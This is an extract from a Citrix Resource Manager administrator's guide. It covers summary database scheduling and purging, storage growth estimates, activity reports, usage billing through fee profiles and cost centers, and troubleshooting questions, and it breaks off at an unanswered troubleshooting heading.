Scheduling Summary Data Collection and Removal
Resource Manager gives you control over several important aspects of maintaining historical records in your summary database. These include: • • • Ignoring periods of low server activity Automatically deleting records from the summary database by scheduling their removal after they are stored for a specified time Setting when you want the Database Connection Server to update the summary database with the day’s summary data
The detailed procedures to follow if you want to carry out these tasks are described in the Help. The following sections provide a general overview of the tasks.
Ignoring Server Metrics During Periods of Low Server Activity
You can configure Resource Manager to ignore server metrics during periods of low server activity; for example, over weekends or late at night, where metric collection may be of little benefit and would increase database size unnecessarily. You can exclude server metrics from summary data on specific days of the week and/or during specific periods during each day. Alternatively, if you need to capture data about business processes such as overnight backups, you may prefer to set up continuous data capture. Note that session, process, application, and server event information is always recorded regardless of any settings you make. You can schedule server metric summary data collection for individual servers or use one setting for multiple servers. Any previous settings for individual servers are replaced with the new settings.
Removing Unwanted Information from the Database
Over time, your database will grow in size as it stores summary data for the server farm. Records you store in the database are kept indefinitely, by default, which can lead to a large database in a short period of time. The greater the number of servers contributing to the database, and the greater the amount of summary data being stored for each server, the faster the database will grow. You may want to keep some of the records stored in the database only for a certain length of time. For example: • If you record the percentage of CPU interrupt time so you can assess potential hardware problems or server overloading on a monthly basis, you may not require the information after assessment
48
Resource Manager Administrator’s Guide
Go to Document Center
•
If you record session and process information on your servers so you can bill users for their usage time, you may not want to keep the records after the bill is created
You can remove unwanted data from the database using a purging schedule. Purging automatically deletes records from the database after they are there for a specified period of time. You can also configure data so that it can be purged only after a bill is created for it. You can configure database purging using the following record type options: • Events • Metrics • Sessions/processes (billed) • Sessions/processes (not billed)
Setting a Purging Schedule
When you configure your purging schedule, you must specify how long the data is to be kept before being purged. The age of a piece of data is calculated by subtracting its end time from the current Database Connection Server time. Retention periods are set to “Indefinite” upon initial setup. The Indefinite setting will never purge the associated data. Important Ensure that the operating system time and date on the originating Resource Manager servers and the Database Connection Server are synchronized. This prevents data from being purged incorrectly; for example, if one of the server farm servers has the date set two days behind that of the Database Connection Server, the data from it is purged two days earlier than expected.
Setting the Summary Database Update Time
The Database Connection Server automatically updates the summary database with summary data from each Resource Manager server once per day. This is referred to as the update time. The default update time on setup is 00:00 hours (midnight). If this is inconvenient, change this to a time of day when server activity is low to prevent slow data transferal or interference with normal server farm activities. During an update, each server in the server farm first sends a request to the Database Connection Server, asking for permission to send its summary data for the day. After accepting the request, the Database Connection Server receives the server’s summary data, and then updates the summary database.
<img src="" alt=""> Go to Document Center
Chapter 4 Recording the History of Servers and Applications
49
Note The update time is always interpreted in the time zone local to each server. Servers in different time zones will request to send their summary data at the update time in their local time zone. You can perform manual updates independently of the update time. You may want to do this, for example, if you want to generate reports on a fresh set of information. If an update is unsuccessful, this is reported on the Summary Database tab, and an alert is sent. You can also temporarily “Sleep” the Database Connection Server to stop the database from being updated. You may want to do this to perform maintenance on the database.
Monitoring the Status of the Summary Database
You can easily check the status of the summary database using the Summary Database tab. To view the summary database status and run-time activity icons 1. In the left pane of the Presentation Server Console, click Resource Manager. 2. In the right pane, click the Summary Database tab. The Status area includes indicators showing the current Database Connection Server, Farm Metric Servers, run-time process, and database import states.
Screenshot of the Summary Database Status Panel
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 50
Resource Manager Administrator’s Guide
Go to Document Center
The meanings of the status icons for the Database Connection Server On/Off/ Configuration indicator are:
The summary database is off or a Database Connection Server is not configured. In this state, no Resource Manager servers are creating and storing summary data for inclusion in the database. The summary database is on and the Database Connection Server is correctly configured. In this state, Resource Manager servers are creating and storing summary data for inclusion in the database. The summary database software version for the Database Connection Server is not accepted because another server in the server farm has a later version of the summary database software installed. You need to upgrade the software on the Database Connection Server. See Chapter 2, “Installing Resource Manager” for details. Note: This situation can arise only when there are mixed releases of the summary database software within a server farm.
Not Configured OK
Critical
The meanings of the status icons for the Farm Metric Server indicator are:
The primary Farm Metric Server is active and has an accepted version of the summary database software installed. The summary database software version for the backup Farm Metric Server is not accepted because another server in the server farm has a later version of the summary database software installed. You need to upgrade the software on the backup Farm Metric Server. See Chapter 2, “Installing Resource Manager” for details. Note: This situation can arise only when there are mixed releases of the summary database software within a server farm. The summary database software version for the primary Farm Metric Server is not accepted because another server in the server farm has a later version of the summary database software installed. You need to upgrade the software on the primary Farm Metric Server. See Chapter 2, “Installing Resource Manager” for details. Note: This situation can arise only when there are mixed releases of the summary database software within a server farm.
OK Warning
Critical
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> Go to Document Center
Chapter 4 Recording the History of Servers and Applications
51
The meanings of the status icons for the Run-time indicator are:
The Database Connection Server is currently updating the database without error. A connection problem between the Database Connection Server and the DBMS that the summary database is on has occurred during a database update. Ensure the Database Connection Server user identification and password for the DBMS is correct. See Chapter 2, “Installing Resource Manager” for details. Use the Server Log for the Database Connection Server (click View Server Log) for further error information. The summary database is off or a Database Connection Server is not configured. In this state, no Resource Manager servers are creating and storing summary data for inclusion in the database. Automatic database updates have been temporarily stopped. This is known as Sleep mode. See “Temporarily stopping database updates in the Resource Manager” online Help for details. The Database Connection Server is in an idle state between database updates.
OK Critical
Not Configured
Sleep Snooze
The meanings of the status icons for the Failed Import indicator are:
The summary database is off or a Database Connection Server is not configured. No update has therefore been attempted. Data has been successfully imported. OK An error has occurred: the import was not successful. Critical
Not Configured
52
Resource Manager Administrator’s Guide
Go to Document Center
Managing the Resource Manager Summary Database
Use the following sections to help you manage how much hard disk space your summary database will require over a period of time. The size of your summary database, as it grows over time, depends on the following basic factors: • • • • • • The number of servers in the server farm The average number of processes run on a server each day The number of Resource Manager metrics you are storing in the database The average number of server events for a server each day The length of time the database records are kept The DBMS summary database transaction log Note The transaction log maintains a history of the data transactions for the summary database. Resource Manager does not automatically purge the DBMS summary database transaction log. You need to configure how the DBMS controls the transaction log to restrict its growth. See your DBMS documentation for details. Various categories of data are written to the database for the server or server farm. These are: • • • • • Process information Server metrics Session information Application metrics Server events (server-down/server-up)
Go to Document Center
Chapter 4 Recording the History of Servers and Applications
53
Estimating Summary Database Growth
You can use the following equations to formulate an idea of how much information will be stored in the summary database per day. Note that these estimates are very approximate and each server or farm may vary considerably from the example. The following schedule of data is for a Resource Manager farm of 100 servers under typical loads. Process information • • Estimate @ 600 sessions per day (with 6 processes per session) Estimate @ 140 bytes per row in process database table
Estimated total is 600 x 140 = 84,000 bytes per server per day Server metrics • • Estimate @ 15 metrics per server (summarized at hourly intervals) Estimate @ 100 bytes per row in metrics database table
Estimated total is 15 x 100 x 24 = 36,000 bytes per server per day Session information • • Estimate @ 100 sessions per server per day Estimate @ 100 bytes per row in session database table
Estimated total is 100 x 100 = 10,000 bytes per server per day Sub Total is 84,000 + 36,000 + 10,000 = 130,000 bytes per server per day. Application metrics • • Estimate @ 20 application metrics per server (summarized at hourly intervals) Estimate @ 100 bytes per row in application metric database table
Estimated total is 20 x 100 x 24 = 48,000 bytes for the farm per day Server events • • Estimate @ 1% of farm servers restarted per day Estimate @ 20 bytes per row in event log database table
Estimated total is 1 x 20 = 20 bytes for the farm per day Sub Total is 24,000 + 20 = 24,020 bytes for the farm per day GRAND TOTAL is (84,000 + 36,000 + 10,000) x 100 + 24,020 = 13.02 MB of summarized information stored in the database per day on a 100 Resource Manager server farm.
54
Resource Manager Administrator’s Guide
Go to Document Center
Managing Summary Database Growth
As described above for a typical farm, summary data stored in your database can be substantial. Unless you manage your external database appropriately, it can grow until all available storage space is used. You need to monitor the rate at which your database is growing. Do this by regularly checking how much disk space is available. You can then use this information to help you set metrics and purge schedules for your database in order to limit growth rates. Some things you might want to do when using a summary database are to: • Regularly check the available disk space on the database host computer so you can work out an average for the amount of information being stored each day. Tip You can configure your summary database DBMS to constrain database size. See the Help for instructions on how to do this. • Regularly create reports on the information you have stored and analyze which metrics are appropriate for long-term storage and historical reporting for your system. If you find you are keeping metrics in the database unnecessarily, remove them from the list being stored. • Work out how often you need to check on resource usage for each metric. You can create reports on these items on a regular basis and set up a purging schedule to remove them from the database after you create the reports. The more regular your reporting, the sooner you can purge the database of the information.
Go to Document Center
CHAPTER 5
Reporting and Analyzing Resource Manager Information
Overview
This chapter describes the reports you can produce using data that is held on each server or in a summary database. Topics include: • • • • • Descriptions of the types of reports you can produce Generating detailed reports about current activity Generating summarized reports about past activity How reports from servers in different time zones and languages are handled Estimating the concurrent user capacity of a server
Detailed instructions on how to produce each type of report are provided in the Help. You can also use the Report Center in the Access Suite Console to produce reports from a variety of real-time and historical data sources. For further details of how to use the Report Center, see Chapter 8 and the assistance provided on the Report Center screens.
56
Resource Manager Administrator’s Guide
Go to Document Center
Generating Reports to Analyze Data
Resource Manager enables you to produce two report types: • Current: These reports are generated from Resource Manager information stored in the local database on each server and can be generated either on a per server basis or for multiple servers. Information is recorded at 15 second intervals and is referred to as real-time. Summary: These reports are generated from data stored in the summary database and can be generated either on a per server basis or for multiple servers. Summary reports are less detailed than current reports; however, they can be generated for any times within the period for which data is stored in the summary database. Summary reports can be customized to include or exclude various record types. Important Summary reports include metric information only for times when data was being stored to the summary database. If you set Resource Manager to capture metric data only for certain times for a specific server, data from outside these periods is not included. All reports are displayed in a report viewer window. Reports contain navigation links to allow you to step between the top of the report and any of the tables within it. You can also print the report, or save it in HTML or comma-separated values (CSV) format, for future reference. Note Resource Manager uses a number of HTML templates to create reports. These are located on each server in the Templates subfolder of the Resource Manager folder. To avoid inconsistencies in the reports, do not edit the templates. If your number format settings use commas as decimal separators, Resource Manager replaces them with semicolons (;) when saving reports to CSV format, because commas are used specifically in this format to separate the items of data in the file.
•
Creating Reports on Current Activity
Current reports can provide detailed information about the following: • • • Statistics about current process activity or application usage in your server farm Statistics about current user activity in your server farm The status of a server at a particular moment
Go to Document Center
Chapter 5 Reporting and Analyzing Resource Manager Information
57
Reporting on the Use of Processes or Applications
You can produce a report containing information about monitored processes in the server farm or processes that are running on a specific server. The report tells you about the resource usage of the process, the times it is active and loaded, and the user(s) running it. For example, you might use this report to examine a server&#39;s details when one or more of its metrics enter an alarm state. The level of detail shown in the report depends on the options you select when you set up the report. The report has a general information section at the top, including the date and time of report generation, the report type, and the various report options. Within the report, you can click links to navigate to the different sections. The information shown in the report is as follows: • Processes The Processes table shows details about each instance of the selected process (or all processes) being run on the server by the selected user (or all users), at the time you generate the report. The table shows the following information: Name: The name of the process. Path: The location of the process on the server. This may help you distinguish between instances. Product Date: The date from the program file. This gives an idea of when the executable was created and may help you identify the process. Type: A Microsoft Windows-defined process type code. Version: The version number that is defined within the program file. Note: This information may not be present for some programs. Start Time: The date and time at which this instance of the process was loaded on the selected server. Times are shown in the local time zone of the server being reported on. % Active: The length of time that this instance of the process was active, as a percentage of the time since it was loaded on the server. User: The user name and domain of the user that is running this instance of the process.
58
Resource Manager Administrator’s Guide
Go to Document Center
•
CPU The CPU table shows CPU usage statistics for the user(s) running the process(es) at the time you generate the report. The table shows the following information: Overall CPU Utilization Kernel mode User mode CPU Utilization while active Kernel mode User mode For information about what these categories mean, consult the documentation for the server operating system. Memory The Memory table shows memory usage statistics for the user(s) running the process(es) at the time you generate the report. The table shows the following information: Working set while active Nominal working set Peak working set Peak paged pool Peak non-paged pool Peak page file usage Page faults/sec For information about what these categories mean, consult the documentation for the server operating system. Times The Times table shows process activity statistics for the user(s) running the process(es) at the time you generate the report. The table shows the following information: Time loaded: The length of time for which the processes had been loaded on the server. Time active: The length of time for which the processes had been active. Active/loaded ratio: The length of time that the processes had been active, as a percentage of the time since they were loaded on the server. Total time loaded: The total length of time for which all the processes had been loaded. Total time active: The total length of time for which all the processes had been active.
•
•
Go to Document Center
Chapter 5 Reporting and Analyzing Resource Manager Information
59
First/last recorded use: For all the processes that were running, the earliest and latest times at which a process was started. Times are shown in the local time zone of the server being reported on. • Users If you generate the report for all users, the Users table shows the user name and domain of all the users running the processes, and the servers on which they are running, at the time you generate the report. Remember, if you generated the report for a single user, then the report only includes that user.
Reporting on User Activity
You can use Resource Manager to provide information about users who have active sessions on a specific server at the time you generate the report. The user report tells you about the users&#39; sessions and the processes they are running. Sessions and processes are shown as different sections in the report, and are described below. The report has a general information section at the top, including the date and time of report generation, the report type, and the various selections made when the report was set up. Within the report, you can click links to navigate to the different sections. The information shown in the report is as follows: • Sessions The Sessions table lists all the sessions that are being run by the selected user(s) on the selected server at the time you generate the report. The table shows the following information: User: The ID and domain of the user who is running the session. Session Name: The name of the session. Protocol: The protocol that was used for the session: for example, TCP/IP. Start Time: The date and time at which the session was started. Times are shown in the local time zone of the server being reported on. Duration: How long the session has been running. Process Count: The number of processes that are running in the session. This information is expanded in the Processes table further down the report. Processes The Processes table shows a complete list of all the processes, and the number of instances of each, run by the selected users on the selected server. The processes are listed in order of start time, giving you a picture of what the user has been doing most recently.
•
60
Resource Manager Administrator’s Guide
Go to Document Center
Looking Back to a Specific Time on a Server
If there is a problem on a particular server, you can produce a Server Snapshot report, showing its status at the time the problem occurred. You can then use this report to evaluate why the problem happened. The report tells you about users and processes utilizing the server, presents information on monitored metrics, and can be stepped back to any time within the last 96 hours. You can also generate Server Snapshot reports from the real-time graph of a server metric. See the Help for more information. Within the report, you can click links to navigate to the different sections. The information shown in the report is as follows: • Processes over 5% CPU or Memory This table shows any processes that use more than 5% of the CPU load or memory. • Users and Processes This table shows the users and the processes they ran on the selected server. The table shows the following information: User: The user name and domain of each user who had an active session on the server. Process: The name of each process that the user ran on the server. There is a separate entry for each instance of the process. Path: The location of each process instance on the server. This may help you distinguish between instances. Version: For each instance, the version number that is defined within the program file. This information may not be present for some programs. Metrics The Metrics table gives information about every metric that was monitored on the server over the 15 second period. The table shows the following information: Object: This is the category being monitored. It is a physical or logical system resource: for example, a computer&#39;s hard disk. Note The Terminal Services object is returned from Windows Terminal Server. The Inactive Sessions counter for this object includes idle sessions.
•
Go to Document Center
Chapter 5 Reporting and Analyzing Resource Manager Information
61
Instance: An individual example of the object or a state it needs to reach in order to be counted. For example, a computer may have more than one hard disk. In this case, the instance would identify which disk is being examined. Counter: This is the specific aspect of the object being monitored. For example, disk free space. Time: The date and time at which the operating system last recorded the metric. Dates are shown in dd/mm/yyyy format; times are shown in the local time zone of the server being reported on. Value: The value of the metric at the time of sampling. Some metrics are average values.
Creating Reports on Past Activity
Summary reports can provide summarized information about the following: • • • Statistics about past process activity in your server farm Statistics about past user activity in your server farm The status of a server for a specified one hour period
Important Generating more than two summary reports at a time will overburden most systems. You can also generate reports from the summary database using an external package such as Crystal Reports. To help you do this, the database schema used by the summary database is described in Appendix B. Citrix provides several Crystal Reports templates that you can use. These templates are available in several languages, and are available for download from <a href="http://www.citrix.com/download/" target="_blank">http://www.citrix.com/download/</a>.
Looking Back at Specific Processor Application Usage
You can use Resource Manager to provide information about the resource usage of a process, users who have run it, and on what servers it ran over a selected period. The level of detail shown in the report depends on the options you select when you set up the report. Remember, if you select a specific server and/or user, the report includes only the information related to that server or user. The options you choose depend on why you are generating the report. For example, you might include the CPU and memory statistics because you want to get an indication of the load that a program imposes on the server. Within the report, you can click links to navigate to the different sections. The information shown in the report is as follows:
62
Resource Manager Administrator’s Guide
Go to Document Center
•
CPU For processes that have finished, the CPU table shows CPU usage statistics for the user(s) who ran the selected process and the server(s) on which it ran. The table shows the following information: Overall CPU Utilization Kernel mode User mode CPU Utilization while active Kernel mode User mode For information about what these categories mean, consult the documentation for the server operating system. Memory For processes that have finished, the memory table shows memory usage statistics for the user(s) who ran the process and the server(s) on which it ran. The table shows the following information: Working set while active Nominal working set Peak working set Peak paged pool Peak non-paged pool Peak page file usage Page faults/sec For information about what these categories mean, consult the documentation for the server operating system. Times The Times table shows process activity statistics for the user(s) who ran the process and the server(s) on which it ran. The table shows the following information: Time loaded: The length of time for which the process was loaded on the server. Time active: The length of time for which the process was actively operating. Active/loaded ratio: The length of time that the process was active, as a percentage of the length of time that it was loaded on the server. Total time loaded: The total length of time for which the process was loaded, for all its different locations and versions.
•
•
Go to Document Center
Chapter 5 Reporting and Analyzing Resource Manager Information
63
Total time active: The total length of time for which the process was active, for all its different locations and versions. First/last recorded use: The earliest and latest times at which the process was started. Times are shown in the local time zone of the server requesting the report. • Users The Users table shows the user name and domain of all the user(s) who ran the process and the server(s) on which it ran. Remember, if you generate the report for a single user/server, then the report only includes that user/server. Servers The Servers table shows a list of all the servers on which the user executed the selected process. If you generate the report for a single server, this section of the report is omitted.
•
Looking Back at Specific Users’ Activities
You can use Resource Manager to provide information about a user&#39;s resource usage, sessions, and the processes used and on what servers, over a selected period. The level of detail shown in the report depends on the options you select when you set up the report. For example, you might use this report when you want to examine the activity of a specific user; for example, to analyze work patterns. Within the report, you can click links to navigate to the different sections. The following information is shown in the report: • Session Summary The Session Summary table lists all the selected user&#39;s sessions over the specified report period, on the selected server(s), and for the selected process(es). The table shows the following information: Start Time: The date and time at which the session started. Times are shown in the local time zone of the Console requesting the report. End Time: The date and time at which the session finished. Times are shown in the local time zone of the Console requesting the report. This area remains blank if the session was still running when the summary database was last updated. Duration: The length of time for which the session was run. This area remains blank if the session was still running when the summary database was last updated. Server: The server on which the session was run. Client: The name of the client machine. Where the user was using the server itself rather than a separate client device, the client machine name is shown as “Console.”
64
Resource Manager Administrator’s Guide
Go to Document Center
Published Application: If the user connected to any published applications, this column shows the names of the applications. Winstation: The Winstation or Sessionname for the session. Protocol: The protocol used for the session; for example, ICA. Process Count: The total number of processes that were run during the session. Processes: A list of the unique process names that were run during the session. For example, if the Process Count is shown as 6 and there is just one process name in the Processes column, that process was run six times. If you select the Process Summary option under Report Options when you generate the report, you will see more detailed information about each process in a Process Summary table. • Favorite Processes The Favorite Processes table lists the top 10 processes run by the selected user, on the selected server(s), and of the selected process(es). The processes are listed in descending order of most frequent use. The table shows the following information: Count: The number of times the user ran the process. Process: The name of the process. Time Loaded: The total length of time that the user ran the process. Time Active: The total length of time for which the process was actively operating (as opposed to just being loaded). % Active: The total length of time for which the process was active, as a percentage of the total time for which it was loaded. Last Use: The date and time at which the user most recently ran the process. Process Summary The Process Summary table shows a complete list of all the processes (or the selected process, if you selected a single process) run by the selected user, within the selected report period, on the selected server(s). The processes are listed in order of start time, giving a picture of what the user was doing at specific times. The table shows the following information: Start Time: The date and time at which the user started the process. Times are shown in the local time zone of the Console requesting the report. End Time: The date and time at which the process terminated. Times are shown in the local time zone of the Console requesting the report. This area remains blank if the session was still running when the summary database was last updated. Server: The server on which the user ran the process. Process Name: The name of the process.
•
Go to Document Center
Chapter 5 Reporting and Analyzing Resource Manager Information
65
Exit Code: The exit code returned for the process, indicating the status of the process when it terminated. Consult the software vendor for more information about the exit codes that are used for specific processes. % Active: The total length of time for which the process was active, as a percentage of the total time for which it was loaded. • Statistics The Statistics table shows general statistics about sessions run by the user on the selected server(s), and for the selected process(es). The table shows the following information: Session duration: The duration of all completed sessions that the user ran. The table shows the average, minimum, and maximum session duration, and the total duration of all sessions. Session duration per day: The duration of all completed sessions that the user ran, per working day. Note Working days are defined as Monday to Friday. Sessions per day: The number of sessions run per working day. Processes per day: The number of processes run per working day. Processes per session: The number of processes per session calculated from the process count in the Session Summary table, against all the sessions that the user ran. • Servers The Servers table shows a list of all the servers on which the user executed one or more processes, and the number of processes the user ran. Remember, if you have generated the report for a single server, the report includes information only for that server.
Looking Back at Activities on a Specific Server
Server Summary reports produce statistical information for a particular server for a one hour period. You can use this report to: • • See users and associated process activity for a farm server, including the process path and version. See the metrics saved to the external database for a server, including their associated object along with the metric counter and mean value. The time the metric was recorded and the value are also displayed.
66
Resource Manager Administrator’s Guide
Go to Document Center
Users and processes, and metrics are shown as two different sections in the report and are described below. The report has a general information section at the top, including the date and time of report generation, the report type, and the various selections made when the report was set up. Within the report, you can click links to navigate to the different sections. The following information is shown in the report: • Users and Processes This table shows the user(s) and the processes they ran on the selected server, over the selected hour. The table shows the following information: User: The user name and domain of each user who had an active session on the server. Process: The name of each process that was run on the server. There is a separate entry for each instance of the process. Path: The location of each process instance on the server. This may help you distinguish between instances. Version: For each instance, the version number that is defined within the program file. Process versions are available for some Win32 processes, but no Win16 or DOS processes. Metrics The Metrics table gives information about every metric that was monitored on the server over the selected hour. The table shows the following information: Object: This is the category being monitored. It is a physical or logical system resource: for example, a computer&#39;s hard disk. Note The Terminal Services object is returned from Windows Terminal Server. The Inactive Sessions counter for this object includes idle sessions. Instance: An individual example of the object or a state it needs to reach in order to be counted. For example, a computer may have more than one hard disk. In this case, the instance would identify which disk is being examined. Counter: This is the specific aspect of the object being monitored. For example, disk free space. Time: The date and time at which the operating system last recorded the metric. Dates are shown in dd/mm/yyyy format; times are shown in the local time zone of the server being reported on. Value: The average value of the metric over the selected hour.
•
Go to Document Center
Chapter 5 Reporting and Analyzing Resource Manager Information
67
How Reports from Servers in Different Time Zones or Locales are Displayed
This section describes how reports are displayed if you have servers in the server farm that are located in different time zones and/or are localized to different languages.
What if a Reporting Server Uses a Different Time Zone?
Times and dates that you enter when generating reports are understood by the system to be in the local time for the server on which you are reporting. All times and dates shown in the report tables are in the local time zone for the server being reported on, with the exception of User Summary and Process Summary reports. User Summary and Process Summary reports show session times in the local time zone of the server requesting the report. Report generation times, in the report header, show the time the report was generated in the requesting server’s local time, plus any UTC (Coordinated Universal Time) offset. Server Summary reports also show UTC offset for times in the Metrics table. An example scenario is a server farm with servers in various parts of the world. This example server farm has: • • Resource Manager servers located in New York, United States (UTC - 5 hours) Resource Manager servers in Berlin, Germany (UTC + 1 hour)
The server farm administrator generates a Server Summary report for the last six hours from a server in New York at 13:00 hours local time. The report shows a generation time of “13:00-05:00” (New York time). An event that occurred two hours previously (11:00 hours in New York) in Berlin will be shown as 16:00 hours—the local time the event occurred in Berlin.
What if a Reporting Server Uses a Different Language?
Resource Manager software supports a number of languages. In a server farm with differing language versions of Resource Manager present, reports are localized to the locale where the Console requesting the report is. In the above example, the information from Berlin (German locale) would be reported in American English (United States locale).
68
Resource Manager Administrator’s Guide
Go to Document Center
Estimating the Concurrent User Capacity of a Server
You can use the summary database to estimate the concurrent user capacity of a server. The summary database stores information concerning CPU and memory usage for various processes running on MetaFrame Presentation Server. To determine user capacity 1. Either • • Add the server to the published applications in an existing farm Create a new farm and limit user access to approximately 20 users per server. —Or—</li>
<li>Using the information in this guide, and the Help, configure and enable the summary database. 3. Ask your users to launch and use the published applications running on the server you are testing. Ensure that users continue to use the server over a suitable period of time, in order to create a record of resource usage that reflects your users’ normal working practices. 4. Create a Crystal report that queries the following: • • Average CPU and memory usage for the specific processes being assessed, per user. Average CPU and memory usage for other processes associated with a user, such as explorer.exe, ctfmon.exe, osa.exe, wfshell.exe, csrss.exe, svchost.exe, and winlogon.exe. A defined threshold. For example, no more than 90% CPU usage and/or no more than 3 GB of RAM used. A calculation to extrapolate the number of users that can be divided into the threshold given the resource usage above.
• •
In general, the longer the time for which users work on the server, the more accurate the data averages that can be collected from the summary database.
Go to Document Center
CHAPTER 6
Billing Users for Resource Usage
Overview
Resource Manager enables you to produce Billing reports based on the information stored in your summary database. Billing reports use the resource usage data from the summary database and a fee profile to calculate the charges for users of the server farm. You define fee profiles to reflect different charging rates and currencies. You can organize individual users and/or user groups into billable groups known as cost centers. You can also bill individual domain users or user groups. When Resource Manager generates a Billing report, it calculates the charges by multiplying the resources used during the report period by the associated fee. All reports are displayed in a report viewer window. You can save a report in HTML or comma-separated values (CSV) format for later printing, viewing, or inclusion in documents. The detailed steps you need to carry out to complete the tasks outlined in this chapter are provided in the Help.
Creating a Fee Profile
Before you can produce Billing reports you should configure at least one fee profile. If a Billing report is generated without using a fee profile, no costs information is provided. In each fee profile you specify a currency and a list of rates to charge for resource usage. Resources you can include in a fee profile are: • • • CPU time Session time Memory usage
70
Resource Manager Administrator’s Guide
Go to Document Center
• •
Process loaded time Process active time
Organizing Users into Cost Centers for Billing
You can organize users into cost centers. For example, to charge different departments within an organization, you create a cost center for each department. Each cost center is linked to a fee profile: it is best to create at least one fee profile before you create cost centers. The “Summary database users” cost center is a predefined cost center that cannot be removed, edited, or renamed. This cost center is defined as all users who have an entry in the summary database. Important Local user groups on farm servers that are included in cost centers can be billed only if the server in question is currently running.
Producing Billing Reports
Cost Centers Report
This type of Billing report is used to charge cost centers for their use of certain resources that are being monitored in the server farm. You need to have at least one fee profile and one cost center to generate useful Cost Center Billing reports. The report tells you about the use of various chargeable resources by the cost center(s) over a selected period. If there are users who are not members of any cost center, you can generate Billing reports for them by billing against domain users. See “Domain Users Report” on page 70 for details. You can avoid billing of system processes by configuring Resource Manager to ignore those processes. See the Help for more information about ignoring processes.
Domain Users Report
This type of Billing report is used to charge individual users or user groups within Microsoft Windows domains for their use of certain resources that are being monitored in the server farm. You need to create at least one fee profile to generate useful Domain User Billing reports. The report tells you about the use of various chargeable resources by the users over a selected period.
Go to Document Center
Chapter 6 Billing Users for Resource Usage
71
How Information Is Presented in the Report
The columns shown in the report depend on the options you choose in the Report Options dialog box. The report is laid out on a per cost center or domain user basis, and is further broken down into the sessions used over the report period. Totals for each column are displayed at the end of the report.
User
The domain user(s) or cost center(s) for which the report has been generated.
Session Start
The date and time each session began during the report period. Dates are shown in dd/mm/yyyy format; times are shown in the local time zone of the Console requesting the report, along with any UTC offset.
Session Elapsed Time
The total length of all session times during the report period. Unfinished sessions are billed for the time elapsed during the report period. Report Totals for session elapsed time at the end of the report shows the combined total of all user sessions, including unfinished sessions, during the report period.
Process
The names of the processes run by the user over the course of each session.
CPU Time Used
The CPU time used for each process over the course of each session during the report period. Report Totals for CPU time used at the end of the report shows the combined total of all CPU time used during the report period.
Memory Used
The memory used for each process (in Megabyte-minutes) over the course of each session. Report Totals for memory used at the end of the report shows the combined total of all memory used during the report period.
Process Loaded Time
The length of time each process was loaded during each session. Report Totals for process loaded time at the end of the report shows the combined total of all process loaded times during the report period.
72
Resource Manager Administrator’s Guide
Go to Document Center
Process Active Time
The length of time each process was active during each session. Report Totals for process active time at the end of the report shows the combined total of all process active times during the report period.
Cost
The amount to be charged for each process during each session. Report Totals for cost at the end of the report shows the combined total of all charges during the report period.
Fee Profile
The fee schedule and currency for chargeable resources is listed at the end of the report.
Go to Document Center
CHAPTER 7
Troubleshooting
Overview
This chapter covers some common questions that you may encounter when using Resource Manager, and offers possible solutions.
Unexpected Behavior
Q: I set up a feature in Resource Manager, but it doesn&#39;t seem to be working. What could be the problem?
Ensure the server you are monitoring was upgraded to Resource Manager for Citrix MetaFrame Presentation Server 3.0, Enterprise Edition. It is possible to use Resource Manager in an environment where some servers in the server farm are upgraded and others are not. However, if you are monitoring a server that has not been upgraded, certain aspects of the user interface will not work for that server, even if the server from which you are running the Presentation Server Console was upgraded.
Q: For a published application, Resource Manager shows the application count as zero, even though some instances of the application are running. How can I see the correct application count?
Check that you specified the full path (rather than just the application executable) in the Properties dialog box for the published application.
Q: The IMA service crashed while I was adding Resource Manager metrics to a server. Why?
If the IMA service stops working while you are adding metrics for monitoring on a server, it may be because you tried to add a metric that has already been added. If there are duplicate instances of a metric, Resource Manager cannot monitor either instance of that metric.
<img src="" alt=""> 74
Resource Manager Administrator’s Guide
Go to Document Center
Q: Some metric values reported by Resource Manager are negative. What should I do?
Some values returned by the Windows Performance API and displayed by Resource Manager are negative. You can ignore these values.
Q: I connected to a Resource Manager server in a different time zone, and saw some apparent time discrepancies. What is happening?
All dates and times displayed in the Presentation Server Console are in the context of the server&#39;s time zone and current local time. When you connect to a server using a MetaFrame Presentation Server Client, the clock shown on your remote desktop is in the client device’s time zone. If you look in the local database, note that the times stored there are in UTC (Coordinated Universal Time), and therefore cannot be directly compared with the times displayed in the Console.
Q: My Database Connection Server is not updating the summary database. Why?
Your Database Connection Server might not be able to connect to the summary database DBMS. If your Database Connection Server cannot communicate with the summary database during a database update, in the Summary Database tab, under Status, the lower indicator changes to Critical . Your summary data is not lost; it is stored locally until the problem is rectified. Note Data that is delayed in reaching the summary database due to Database Connection Server problems is subject to purge settings once in the summary database. For example, if you cannot update the summary database for a week and some of your stored data is set to be purged after five days, when the problems are rectified and the data is stored in the summary database, it is purged at the next purge time because it is already five days old. To view any problems that have occurred 1. In the left pane of the Presentation Server Console, click Resource Manager. 2. In the right pane, click the Summary Database tab. 3. Click View Server Log. The server log shows if any problems have occurred. To address communication problems between the Database Connection Server and the summary database • Ensure the user identification password for the Database Connection Server is correct. See “Setting a System Data Source Name” on page 22 for details.
Go to Document Center
Chapter 7 Troubleshooting
75
•
If the connection problem still exists, the Database Connection Server may have failed. This is also indicated by a “Server Down” status icon in the Resource Manager Watcher window. More information about the fault is available from that server’s Resource Manager server log.
Q: I generated a Resource Manager summary report and the information I expected to find was not there. Where is it?
When you create summary reports, all information for the report is derived from records stored in the summary database. If you encounter problems with your summary reports, these may be due to the following reasons: • The Resource Manager metric you want to report on is not set to be stored in the summary database. Check that the metric in question is set to be stored in the external database for the relevant server. See “Selecting Server and Application Metrics to Record in the Database” on page 46. • The report was created during the 24-hour period between database updates. If you create several reports for the same information between the 24 hourly automatic database update times, the information in the reports will not change. If you need information on a server for periods between database updates, use Resource Manager Current reports. See Chapter 4, “Reporting and Analyzing Information”. • The report was created after the information was purged from the summary database. You must create reports on information before it is purged from the summary database. Check whether your purging schedule gives you time to create appropriate reports. See “Removing Unwanted Information from the Database” on page 47 for details about database purging schedules. • The name of a contributing Resource Manager server is changed. Each server in the server farm is identified to the summary database by the server’s network identification computer name. If you change a server’s name, existing records referencing the old name remain in the database until purged while new records for the new server name are created. Note If you change a server’s name from x to y, and rename another server in the server farm from z to x, new reports for server x are collated from data from both new server x and old server x.
76
Resource Manager Administrator’s Guide
Go to Document Center
Q: I am getting the error message: “The Farm Metric Server cannot be contacted.” What can I do?
